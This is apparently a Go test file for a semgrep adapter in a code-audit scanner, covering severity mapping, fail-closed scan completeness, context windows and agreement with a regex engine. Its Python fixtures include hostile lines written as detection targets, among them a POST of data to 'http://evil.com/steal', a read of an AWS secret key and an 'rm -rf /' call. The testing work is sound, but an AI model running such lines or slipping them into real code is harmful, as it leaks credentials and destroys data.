package codeaudit

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// ── Fixtures and process-boundary stub ────────────────────

// semgrepFixtureSource is nine lines so that the window around a match on line
// five has content on both sides. A match on the first or last line would let a
// broken window pass, because the clamped and unclamped results would agree.
func semgrepFixtureSource() string {
	return strings.Join([]string{
		"import os",
		"import subprocess",
		"a = 1",
		"b = 2",
		"subprocess.run(cmd, shell=True)",
		"c = 3",
		"d = 4",
		"e = 5",
		"f = 6",
	}, "\n") + "\n"
}

// semgrepCall records one invocation of the semgrep CLI.
type semgrepCall struct {
	bin  string
	args []string
}

// stubSemgrep replaces the adapter's process boundary with a canned response.
//
// The tests below use it to pin the adapter's own logic — rule mapping,
// fail-fast, completeness — and to pin the argument vector without running
// anything. That matters because the alternative is to assert against the real
// CLI's behaviour, which tests semgrep rather than the code under test, and
// because several of the failure modes worth pinning (a truncated target list,
// a non-zero exit) cannot be produced on demand by the real CLI. The real CLI
// is exercised by the integration tests at the bottom of this file.
type stubSemgrep struct {
	calls []semgrepCall

	stdout []byte
	exit   int
	err    error
}

func (s *stubSemgrep) exec(_ context.Context, bin string, args []string) ([]byte, int, error) {
	s.calls = append(s.calls, semgrepCall{bin: bin, args: args})
	return s.stdout, s.exit, s.err
}

// recordingSemgrep passes every call through to the real CLI while recording the
// argument vector, for the tests that need both the CLI's real output and proof
// of what it was asked to do.
type recordingSemgrep struct {
	inner func(ctx context.Context, bin string, args []string) ([]byte, int, error)
	calls []semgrepCall
}

func (r *recordingSemgrep) exec(ctx context.Context, bin string, args []string) ([]byte, int, error) {
	r.calls = append(r.calls, semgrepCall{bin: bin, args: args})
	return r.inner(ctx, bin, args)
}

// semgrepTestEngine builds an adapter over a one-file fixture directory, with
// its process boundary replaced by stub. It returns the engine and the absolute
// path of the file the scan should find.
func semgrepTestEngine(t *testing.T, stub *stubSemgrep) (*semgrepEngine, string) {
	t.Helper()
	scanDir := t.TempDir()
	target := writeTestFile(t, scanDir, "train.py", semgrepFixtureSource())
	rulesDir := t.TempDir()
	rulesPath := writeTestFile(t, rulesDir, "rules.yaml", "rules: []\n")

	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), rulesPath)
	engine.execFn = stub.exec
	return engine, target
}

// semgrepResultJSON renders one entry of the results array. It is written as a
// literal rather than by marshalling a Go struct, so that the field names the
// adapter parses are pinned by the test rather than by the parser itself.
func semgrepResultJSON(path, checkID, ruleFamily, severity string, line int) string {
	return fmt.Sprintf(`{
		"check_id": %q,
		"path": %q,
		"start": {"line": %d, "col": 1, "offset": 0},
		"extra": {
			"message": "test message",
			"severity": %q,
			"metadata": {"category": "test", "rule_family": %q}
		}
	}`, checkID, path, line, severity, ruleFamily)
}

// semgrepPayload assembles a semgrep --json payload. results and errors are
// passed through verbatim so each test controls exactly one aspect of the
// response; scanned is the path list the scan claims to have read.
func semgrepPayload(scanned []string, results string, errors string) []byte {
	quoted := make([]string, 0, len(scanned))
	for _, p := range scanned {
		quoted = append(quoted, fmt.Sprintf("%q", p))
	}
	return []byte(fmt.Sprintf(`{
		"version": "1.177.0",
		"results": [%s],
		"errors": [%s],
		"paths": {"scanned": [%s]},
		"skipped_rules": []
	}`, results, errors, strings.Join(quoted, ",")))
}

// ── Rule mapping and severity authority ───────────────────

// TestSemgrepEngineReadsSeverityFromTheProductionRuleTable pins that the TAA
// rule table, not semgrep, is the authority on severity.
//
// On this corpus semgrep's ERROR/WARNING happens to line up with the table's
// HIGH/MEDIUM for all thirteen rules, so a test that only compared the two
// would pass whichever source the adapter read. The fixture below breaks the
// coincidence deliberately: the injected table says ENV_001 is HIGH while the
// payload says WARNING, so reading the wrong source is visible.
func TestSemgrepEngineReadsSeverityFromTheProductionRuleTable(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	// The rule table is the input to this decision, so it is the thing varied.
	rules := DefaultRules()
	for i := range rules {
		if rules[i].ID == "ENV_001" {
			rules[i].Severity = SeverityHigh
		}
	}
	engine.scanner = NewScanner(rules, DefaultConfig())

	stub.stdout = semgrepPayload([]string{target},
		semgrepResultJSON(target, "taa-env-secret-python", "ENV_001", "WARNING", 5), "")

	report, err := engine.ScanDirectory(filepath.Dir(target))
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(report.Findings) != 1 {
		t.Fatalf("len(Findings) = %d, want 1", len(report.Findings))
	}

	got := report.Findings[0]
	if got.Severity != SeverityHigh {
		t.Errorf("Severity = %q, want %q; the adapter took severity from semgrep's WARNING instead of the production rule table",
			got.Severity, SeverityHigh)
	}
	if got.RuleID != "ENV_001" {
		t.Errorf("RuleID = %q, want %q; rule_family must map back to the TAA rule id", got.RuleID, "ENV_001")
	}
	if got.EngineRuleID != "taa-env-secret-python" {
		t.Errorf("EngineRuleID = %q, want %q", got.EngineRuleID, "taa-env-secret-python")
	}
	// Category and Description also come from the table, so that a finding from
	// either engine reads the same downstream.
	if got.Category == "" || got.Description == "" {
		t.Errorf("Category = %q, Description = %q; both should be copied from the production rule table",
			got.Category, got.Description)
	}
}

// TestSemgrepEngineRejectsUnknownRuleFamily pins the fail-fast requirement.
//
// The dangerous default is MEDIUM: an unmapped rule silently becomes a medium
// finding, which the gate policy blocks and the assist policy lets through, so
// the same misconfiguration means one thing in one deployment and something
// else in another. A rule the adapter cannot place must stop the scan.
func TestSemgrepEngineRejectsUnknownRuleFamily(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target},
		semgrepResultJSON(target, "taa-mystery-python", "ZZZ_999", "ERROR", 5), "")

	report, err := engine.ScanDirectory(filepath.Dir(target))
	if err == nil {
		t.Fatalf("unknown rule_family ZZZ_999 did not fail the scan; report = %+v", report)
	}
	if !strings.Contains(err.Error(), "ZZZ_999") {
		t.Errorf("error %q does not name the unmapped rule family, so the operator cannot fix it", err)
	}
}

// TestSemgrepEngineRejectsMissingRuleFamily is the same requirement for a rule
// that declares no family at all: the zero value must not fall through to a
// default severity either.
func TestSemgrepEngineRejectsMissingRuleFamily(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target}, fmt.Sprintf(`{
		"check_id": "taa-anonymous-python",
		"path": %q,
		"start": {"line": 5, "col": 1, "offset": 0},
		"extra": {"message": "m", "severity": "ERROR", "metadata": {"category": "test"}}
	}`, target), "")

	if _, err := engine.ScanDirectory(filepath.Dir(target)); err == nil {
		t.Error("a finding with no rule_family was accepted; it has no place in the rule table and no severity")
	}
}

// ── Context construction ──────────────────────────────────

// TestSemgrepEngineBuildsContextFromTheFile pins the byte-level context window.
//
// The window is reconstructed in Go from the file and the reported line number,
// never taken from semgrep's own `extra.lines`, because the Tier 2 prompt is
// built from these three fields and the whole point of the adapter is that a
// finding means the same thing to the LLM whichever engine produced it. The
// expected strings are written out rather than recomputed with contextWindow,
// which would make the test agree with any implementation that calls it.
func TestSemgrepEngineBuildsContextFromTheFile(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target},
		semgrepResultJSON(target, "taa-cmd-exec-python", "CMD_001", "ERROR", 5), "")

	report, err := engine.ScanDirectory(filepath.Dir(target))
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if len(report.Findings) != 1 {
		t.Fatalf("len(Findings) = %d, want 1", len(report.Findings))
	}

	got := report.Findings[0]
	if got.Line != 5 {
		t.Errorf("Line = %d, want 5", got.Line)
	}
	if want := "subprocess.run(cmd, shell=True)"; got.CodeSnippet != want {
		t.Errorf("CodeSnippet = %q, want %q", got.CodeSnippet, want)
	}
	if want := "import subprocess\na = 1\nb = 2"; got.ContextBefore != want {
		t.Errorf("ContextBefore = %q, want %q", got.ContextBefore, want)
	}
	if want := "c = 3\nd = 4\ne = 5"; got.ContextAfter != want {
		t.Errorf("ContextAfter = %q, want %q", got.ContextAfter, want)
	}
}

// TestSemgrepEngineRejectsFindingPastEndOfFile guards the reconstruction: a line
// number the file does not have cannot be turned into context, and inventing an
// empty one would send the LLM a finding with no code attached.
func TestSemgrepEngineRejectsFindingPastEndOfFile(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target},
		semgrepResultJSON(target, "taa-cmd-exec-python", "CMD_001", "ERROR", 500), "")

	if _, err := engine.ScanDirectory(filepath.Dir(target)); err == nil {
		t.Error("a finding on line 500 of a nine-line file was accepted")
	}
}

// ── Completeness ──────────────────────────────────────────

// TestSemgrepEngineTreatsErrorsAsIncomplete pins that semgrep's own error list
// fails the scan.
//
// This is the failure that matters most, because semgrep exits 0 and returns an
// empty results array when it cannot read a target: an adapter that reads only
// `results` reports "no findings" for a scan that never happened, and a clean
// report is exactly what an attacker wants. Measured on 1.177.0, passing one
// nonexistent path among valid ones yields errors[0].type = SemgrepError,
// results = [], and exit code 0.
func TestSemgrepEngineTreatsErrorsAsIncomplete(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target}, "", `{
		"code": 2, "level": "error", "type": "SemgrepError",
		"message": "Invalid scanning root: /tmp/gone.py"
	}`)

	if _, err := engine.ScanDirectory(filepath.Dir(target)); err == nil {
		t.Error("a scan reporting a SemgrepError was accepted; its empty result set reads as a clean scan")
	}
}

// TestSemgrepEngineTreatsUnscannedTargetAsIncomplete pins the other half of the
// same problem: a scan that says nothing went wrong but did not read a file it
// was given.
//
// The adapter passes explicit file targets, so it knows exactly which files a
// complete scan covers. Comparing that list against paths.scanned is what turns
// "found nothing" into "proved it looked", and it is why the target list is
// passed rather than the directory.
func TestSemgrepEngineTreatsUnscannedTargetAsIncomplete(t *testing.T) {
	stub := &stubSemgrep{}
	scanDir := t.TempDir()
	one := writeTestFile(t, scanDir, "one.py", semgrepFixtureSource())
	writeTestFile(t, scanDir, "two.py", semgrepFixtureSource())
	rulesDir := t.TempDir()
	rulesPath := writeTestFile(t, rulesDir, "rules.yaml", "rules: []\n")

	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), rulesPath)
	engine.execFn = stub.exec

	// paths.scanned omits two.py, so half the input was never read.
	stub.stdout = semgrepPayload([]string{one}, "", "")

	_, err := engine.ScanDirectory(scanDir)
	if err == nil {
		t.Error("a scan that read one of two targets was accepted as complete")
	}
}

// TestSemgrepEngineRejectsNonZeroExit pins that a failed process is not a clean
// scan even when its output parses.
func TestSemgrepEngineRejectsNonZeroExit(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target}, "", "")
	stub.exit = 2

	if _, err := engine.ScanDirectory(filepath.Dir(target)); err == nil {
		t.Error("a scan whose process exited 2 was accepted")
	}
}

// TestSemgrepEngineRejectsUnparseableOutput pins that truncated or corrupted
// output fails the scan instead of producing an empty finding list.
func TestSemgrepEngineRejectsUnparseableOutput(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = []byte(`{"version": "1.177.0", "results": [{"check_id": `)

	if _, err := engine.ScanDirectory(filepath.Dir(target)); err == nil {
		t.Error("unparseable semgrep output was treated as a completed scan")
	}
}

// TestSemgrepEngineRejectsUnrunnableProcess pins that a binary that never
// started is an error rather than an empty report.
func TestSemgrepEngineRejectsUnrunnableProcess(t *testing.T) {
	stub := &stubSemgrep{err: exec.ErrNotFound}
	engine, target := semgrepTestEngine(t, stub)

	if _, err := engine.ScanDirectory(filepath.Dir(target)); err == nil {
		t.Error("a semgrep that could not be started was treated as a completed scan")
	}
}

// TestSemgrepEngineMarksCleanScanComplete is the other direction, and it is the
// one that keeps the checks above from being satisfied by always failing: a
// scan that read every target and reported no errors is complete.
func TestSemgrepEngineMarksCleanScanComplete(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target}, "", "")

	report, err := engine.ScanDirectory(filepath.Dir(target))
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if !report.ScanComplete {
		t.Error("ScanComplete = false for a scan that read every target and reported no error")
	}
	if report.Engine != EngineNameSemgrep {
		t.Errorf("Engine = %q, want %q", report.Engine, EngineNameSemgrep)
	}
	if report.EngineVersion != "1.177.0" {
		t.Errorf("EngineVersion = %q, want the version semgrep reported", report.EngineVersion)
	}
	if report.ProcessExitCode != 0 {
		t.Errorf("ProcessExitCode = %d, want 0", report.ProcessExitCode)
	}
	if report.Passed != true {
		t.Error("Passed = false for a scan with no findings")
	}
}

// ── Argument vector ───────────────────────────────────────

// TestSemgrepEnginePassesTheEvidencedCommandContract pins the flags, so that a
// change to the invocation is a test failure rather than a silent difference
// between the engine the evidence describes and the one production runs.
//
// The targets are the files the adapter walked, passed explicitly rather than
// as a directory. That is a deliberate departure from the command the benchmark
// runner uses, and it is load-bearing: measured on 1.177.0, a directory target
// descends into venv/ and reports findings the regex arm never sees, so the two
// engines would not agree on what the code even is.
func TestSemgrepEnginePassesTheEvidencedCommandContract(t *testing.T) {
	stub := &stubSemgrep{}
	engine, target := semgrepTestEngine(t, stub)

	stub.stdout = semgrepPayload([]string{target}, "", "")
	if _, err := engine.ScanDirectory(filepath.Dir(target)); err != nil {
		t.Fatalf("scan: %v", err)
	}

	if len(stub.calls) != 1 {
		t.Fatalf("semgrep was invoked %d times, want 1", len(stub.calls))
	}
	args := stub.calls[0].args

	for _, want := range []string{"--config", "--json", "--quiet", "--disable-version-check", "--no-git-ignore"} {
		if !containsArg(args, want) {
			t.Errorf("args %v do not contain %q", args, want)
		}
	}
	if !containsArg(args, engine.rulesPath) {
		t.Errorf("args %v do not name the rules path %q", args, engine.rulesPath)
	}
	// The walked file must be a target; nothing else may be, or the scan covers
	// files the adapter did not account for in its completeness check.
	targets := targetsOf(args)
	if len(targets) != 1 || targets[0] != target {
		t.Errorf("targets = %v, want exactly [%s]", targets, target)
	}
}

// ── Determinism ───────────────────────────────────────────

// TestSemgrepEngineOrdersFindingsDeterministically pins the ordering, which
// semgrep does not promise. The finding cap keeps the first N findings, so an
// unstable order makes a truncated scan keep a different set each run, and the
// reports stop being comparable.
func TestSemgrepEngineOrdersFindingsDeterministically(t *testing.T) {
	stub := &stubSemgrep{}
	scanDir := t.TempDir()
	b := writeTestFile(t, scanDir, "b.py", semgrepFixtureSource())
	a := writeTestFile(t, scanDir, "a.py", semgrepFixtureSource())
	rulesDir := t.TempDir()
	rulesPath := writeTestFile(t, rulesDir, "rules.yaml", "rules: []\n")

	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), rulesPath)
	engine.execFn = stub.exec

	cmd := func(path string) string {
		return semgrepResultJSON(path, "taa-cmd-exec-python", "CMD_001", "ERROR", 5)
	}
	env := func(path string) string {
		return semgrepResultJSON(path, "taa-env-secret-python", "ENV_001", "WARNING", 6)
	}
	// Deliberately reverse-ordered: b before a, and the later line first.
	stub.stdout = semgrepPayload([]string{a, b}, strings.Join([]string{
		cmd(b), env(b), env(a), cmd(a),
	}, ","), "")

	report, err := engine.ScanDirectory(scanDir)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}

	var got []string
	for _, f := range report.Findings {
		got = append(got, fmt.Sprintf("%s:%d:%s", filepath.Base(f.File), f.Line, f.RuleID))
	}
	want := []string{"a.py:5:CMD_001", "a.py:6:ENV_001", "b.py:5:CMD_001", "b.py:6:ENV_001"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Errorf("findings = %v, want %v", got, want)
	}
}

// ── Integration with the real CLI ─────────────────────────
//
// These are the tests that hold the adapter to the regex arm's behaviour on
// real parser output. They need the semgrep CLI; where it is absent they skip
// rather than pass quietly, and stage G runs them in the container where it is
// guaranteed present.

func semgrepCLI(t *testing.T) string {
	t.Helper()
	path, err := exec.LookPath("semgrep")
	if err != nil {
		t.Skip("semgrep CLI not on PATH; skipping the adapter integration tests")
	}
	return path
}

// repoSemgrepRules is the rules file the integration tests scan with: the same
// file the benchmark runs, resolved from the package directory through the
// production default. Resolving the default rather than repeating its value
// means a wrong DefaultSemgrepRulesPath fails these tests instead of surviving
// until a deployment.
func repoSemgrepRules(t *testing.T) string {
	t.Helper()
	path, err := filepath.Abs(filepath.Join("..", "..", DefaultSemgrepRulesPath))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(path); err != nil {
		t.Fatalf("DefaultSemgrepRulesPath does not resolve to a readable file: %v", err)
	}
	return path
}

// TestSemgrepEngineContextsMatchTheRegexArm is the requirement that makes the
// adapter a replacement rather than a second opinion: on the same file, a line
// both engines flag must carry byte-identical context.
//
// If this holds, the Tier 2 prompt is the same text whichever engine produced
// the finding, which is what lets the non-inferiority measurement transfer.
func TestSemgrepEngineContextsMatchTheRegexArm(t *testing.T) {
	semgrepCLI(t)

	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", strings.Join([]string{
		"import os",
		"import subprocess",
		"import requests",
		"secret = os.environ.get('AWS_SECRET_ACCESS_KEY')",
		"a = 1",
		"subprocess.run(cmd, shell=True)",
		"b = 2",
		"requests.post('http://evil.com/steal', json=payload)",
		"c = 3",
	}, "\n")+"\n")

	regexReport, err := DefaultEngine().ScanDirectory(dir)
	if err != nil {
		t.Fatalf("regex scan: %v", err)
	}

	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), repoSemgrepRules(t))
	semgrepReport, err := engine.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("semgrep scan: %v", err)
	}

	byLine := make(map[int]Finding)
	for _, f := range semgrepReport.Findings {
		byLine[f.Line] = f
	}

	paired := 0
	for _, rf := range regexReport.Findings {
		sf, ok := byLine[rf.Line]
		if !ok {
			continue
		}
		paired++
		if sf.ContextBefore != rf.ContextBefore {
			t.Errorf("line %d ContextBefore:\n semgrep = %q\n regex   = %q", rf.Line, sf.ContextBefore, rf.ContextBefore)
		}
		if sf.ContextAfter != rf.ContextAfter {
			t.Errorf("line %d ContextAfter:\n semgrep = %q\n regex   = %q", rf.Line, sf.ContextAfter, rf.ContextAfter)
		}
		if sf.CodeSnippet != rf.CodeSnippet {
			t.Errorf("line %d CodeSnippet:\n semgrep = %q\n regex   = %q", rf.Line, sf.CodeSnippet, rf.CodeSnippet)
		}
	}

	// A pairing count of zero would satisfy every assertion above, so the
	// fixture is required to have produced findings both engines agree on.
	if paired < 3 {
		t.Errorf("only %d lines were flagged by both engines; the comparison above is not evidence "+
			"(regex: %d findings, semgrep: %d findings)", paired, len(regexReport.Findings), len(semgrepReport.Findings))
	}
}

// TestSemgrepEngineSkipsCommentLinesLikeTheRegexArm pins that commented-out code
// is reported by neither engine.
//
// The regex arm skips a line whose trimmed form starts with '#'. Semgrep gets
// the same result by a different route — all thirteen rules are AST patterns and
// comments are not in the AST. The routes agree today, and this test is what
// notices if a future rule uses pattern-regex and stops agreeing.
func TestSemgrepEngineSkipsCommentLinesLikeTheRegexArm(t *testing.T) {
	semgrepCLI(t)

	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", strings.Join([]string{
		"import subprocess",
		"# subprocess.run(cmd, shell=True)",
		"#os.system('rm -rf /')",
		"a = 1",
	}, "\n")+"\n")

	regexReport, err := DefaultEngine().ScanDirectory(dir)
	if err != nil {
		t.Fatalf("regex scan: %v", err)
	}
	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), repoSemgrepRules(t))
	semgrepReport, err := engine.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("semgrep scan: %v", err)
	}

	if len(regexReport.Findings) != 0 {
		t.Fatalf("regex arm reported %d findings on a file whose only matches are comments", len(regexReport.Findings))
	}
	if len(semgrepReport.Findings) != 0 {
		t.Errorf("semgrep arm reported %d findings on a file whose only matches are comments: %+v",
			len(semgrepReport.Findings), semgrepReport.Findings)
	}
}

// TestSemgrepEngineAgreesWithTheRegexArmOnTheFileSet pins that both engines call
// the same set of files the input.
//
// The adapter passes explicit targets precisely so this is true: a directory
// target sends semgrep into venv/ and __pycache__/, which the regex arm skips,
// and an engine that scans files the other one never read is not a replacement
// for it.
func TestSemgrepEngineAgreesWithTheRegexArmOnTheFileSet(t *testing.T) {
	semgrepCLI(t)

	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", "import os\nsubprocess = 1\n")
	writeTestFile(t, dir, "pkg/deep/util.py", "x = 1\n")
	writeTestFile(t, dir, "venv/lib/bad.py", "subprocess.run(cmd, shell=True)\n")
	writeTestFile(t, dir, "__pycache__/cached.py", "subprocess.run(cmd, shell=True)\n")
	writeTestFile(t, dir, "notes.txt", "subprocess.run(cmd, shell=True)\n")

	regexReport, err := DefaultEngine().ScanDirectory(dir)
	if err != nil {
		t.Fatalf("regex scan: %v", err)
	}
	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), repoSemgrepRules(t))
	// The real CLI is wrapped in a recorder so the test can see what it was
	// asked to scan. Asserting only on the findings would leave the reason this
	// works invisible: a directory target fails the completeness check before
	// any finding is examined, so the finding assertions never run.
	recorder := &recordingSemgrep{inner: runSemgrepCLI}
	engine.execFn = recorder.exec

	semgrepReport, err := engine.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("semgrep scan: %v", err)
	}

	if regexReport.FilesCount != 2 {
		t.Fatalf("regex arm counted %d files, want 2; the fixture no longer isolates the skip directories", regexReport.FilesCount)
	}
	if semgrepReport.FilesCount != regexReport.FilesCount {
		t.Errorf("FilesCount: semgrep = %d, regex = %d", semgrepReport.FilesCount, regexReport.FilesCount)
	}
	if len(regexReport.Findings) != 0 {
		t.Fatalf("regex arm reported %d findings; the fixture is meant to be clean outside the skipped directories",
			len(regexReport.Findings))
	}
	if len(semgrepReport.Findings) != 0 {
		t.Errorf("semgrep arm reported %d findings from files the regex arm never read: %+v",
			len(semgrepReport.Findings), semgrepReport.Findings)
	}

	// The file set is decided by the walk, and what the walk produced is what
	// semgrep was given. Nothing under venv/, __pycache__/ or the .txt file may
	// appear here, which is what a directory target would do.
	targets := targetsOf(recorder.calls[0].args)
	want := []string{filepath.Join(dir, "pkg", "deep", "util.py"), filepath.Join(dir, "train.py")}
	if strings.Join(targets, ",") != strings.Join(want, ",") {
		t.Errorf("semgrep targets = %v, want the walked files %v", targets, want)
	}
}

// TestSemgrepEngineReportsARealVersion pins that EngineVersion is filled from
// the CLI rather than left empty, so a report can name the engine that produced
// it down to the version.
func TestSemgrepEngineReportsARealVersion(t *testing.T) {
	semgrepCLI(t)

	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", "x = 1\n")
	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), repoSemgrepRules(t))

	report, err := engine.ScanDirectory(dir)
	if err != nil {
		t.Fatalf("scan: %v", err)
	}
	if !report.ScanComplete {
		t.Error("ScanComplete = false for a clean fixture")
	}
	if report.EngineVersion == "" {
		t.Error("EngineVersion is empty; the report cannot say which semgrep produced it")
	}
	if !report.Passed {
		t.Error("Passed = false for a clean fixture")
	}
}

// TestSemgrepEngineDefaultHasATimeout pins that the produced engine carries a
// deadline. Without one a hung CLI blocks the import path indefinitely, and the
// fail-closed design assumes the scan returns.
func TestSemgrepEngineDefaultHasATimeout(t *testing.T) {
	engine := NewSemgrepEngine(NewScanner(DefaultRules(), DefaultConfig()), repoSemgrepRules(t))
	if engine.timeout <= 0 {
		t.Errorf("timeout = %v; a scan with no deadline can hang the import path", engine.timeout)
	}
	if engine.timeout > 15*time.Minute {
		t.Errorf("timeout = %v, which is longer than an import can plausibly wait", engine.timeout)
	}
}

// ── Helpers ───────────────────────────────────────────────

func containsArg(args []string, want string) bool {
	for _, a := range args {
		if a == want {
			return true
		}
	}
	return false
}

// targetsOf returns the positional arguments, which are the files to scan. It
// starts after the subcommand, which is positional but is not a target. Every
// flag in the contract takes its value as a separate argument, so a flag's value
// is skipped by looking at the known flag names.
func targetsOf(args []string) []string {
	valueOfFlag := map[string]bool{
		"--config": true, "--include": true, "--exclude": true, "--json-output": true,
	}
	var targets []string
	for i := 1; i < len(args); i++ {
		if strings.HasPrefix(args[i], "-") {
			if valueOfFlag[args[i]] {
				i++
			}
			continue
		}
		targets = append(targets, args[i])
	}
	return targets
}

// TestStubPayloadIsValidJSON guards the fixture builder itself: a malformed
// payload would make every completeness test above pass for the wrong reason,
// by failing to parse rather than by failing the check under test.
func TestStubPayloadIsValidJSON(t *testing.T) {
	payload := semgrepPayload([]string{"/a.py", "/b.py"},
		semgrepResultJSON("/a.py", "taa-x-python", "CMD_001", "ERROR", 3), "")
	var decoded map[string]any
	if err := json.Unmarshal(payload, &decoded); err != nil {
		t.Fatalf("fixture payload is not valid JSON: %v\n%s", err, payload)
	}
	if got := len(decoded["results"].([]any)); got != 1 {
		t.Errorf("len(results) = %d, want 1", got)
	}
	if got := len(decoded["paths"].(map[string]any)["scanned"].([]any)); got != 2 {
		t.Errorf("len(paths.scanned) = %d, want 2", got)
	}
}
